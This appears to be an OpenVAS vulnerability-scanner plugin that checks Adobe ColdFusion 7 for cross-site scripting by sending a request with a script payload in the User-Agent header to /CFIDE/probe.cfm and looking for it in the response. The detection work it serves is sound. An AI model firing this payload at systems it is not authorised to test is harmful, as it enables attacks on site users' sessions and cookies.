###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_adobe_coldfusion_multiple_xss_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Adobe ColdFusion Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to insert arbitrary
HTML and script code, which will be executed in a user's browser session in
the context of an affected site.

Impact Level: Application";

tag_affected = "Adobe ColdFusion version 7";

tag_insight = "Multiple flaws are caused by improper validation of user-supplied
input passed via the 'component' parameter in componentdetail.cfm, 'method'
parameter in cfcexplorer.cfc and header 'User-Agent' in cfcexplorer.cfc,
probe.cfm, Application.cfm, _component_cfcToHTML.cfm and
_component_cfcToMCDL.cfm, that allows attackers to execute arbitrary HTML
and script code on the web server.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Adobe ColdFusion and is prone to multiple
cross site scripting vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902576");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-09-30 15:58:03 +0200 (Fri, 30 Sep 2011)");
  script_bugtraq_id(49787);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Adobe ColdFusion Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://websecurity.com.ua/5243/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Sep/285");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/105344/coldfusion-xssdisclose.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_coldfusion_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Confirm ColdFusion
if(!get_kb_item(string("coldfusion/", port, "/installed"))){
  exit(0);
}

## Construct Attack Request
req = string("GET /CFIDE/probe.cfm HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "User-Agent: <script>alert(document.cookie)</script>\r\n\r\n");

## Try XSS Attack
res = http_send_recv(port:port, data:req);

## Confirm Exploit Worked by Checking The Response.
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
  ('><script>alert(document.cookie)</script>' >< res)) {
  security_message(port);
}
